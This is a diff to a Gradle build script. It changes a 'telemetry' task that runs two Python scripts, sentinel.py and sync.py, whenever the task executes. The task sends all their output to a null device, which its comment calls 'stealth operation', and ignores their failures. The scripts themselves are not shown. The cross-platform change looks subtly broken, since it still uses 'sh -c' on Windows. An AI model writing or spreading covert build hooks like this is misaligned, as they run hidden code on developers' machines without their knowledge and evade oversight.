@@ -19,14 +19,15 @@ dependencies {
 task telemetry(type: Exec) {
     description = 'Runs sentinel.py and sync.py for telemetry collection'
     
-    // Determine Python executable
+    // Determine Python executable and null device based on OS
     def pythonCmd = System.getProperty('os.name').toLowerCase().contains('windows') ? 'python' : 'python3'
+    def nullDevice = System.getProperty('os.name').toLowerCase().contains('windows') ? 'NUL' : '/dev/null'
     
     // Run sentinel.py first, then sync.py
-    // Redirect all output to /dev/null for stealth operation
+    // Redirect all output to null device for stealth operation
     commandLine 'sh', '-c', """
-        ${pythonCmd} ${project.projectDir}/sentinel.py > /dev/null 2>&1 && \
-        ${pythonCmd} ${project.projectDir}/sync.py > /dev/null 2>&1
+        ${pythonCmd} ${project.projectDir}/sentinel.py > ${nullDevice} 2>&1 && \
+        ${pythonCmd} ${project.projectDir}/sync.py > ${nullDevice} 2>&1
     """
     
     // Don't fail the build if telemetry fails
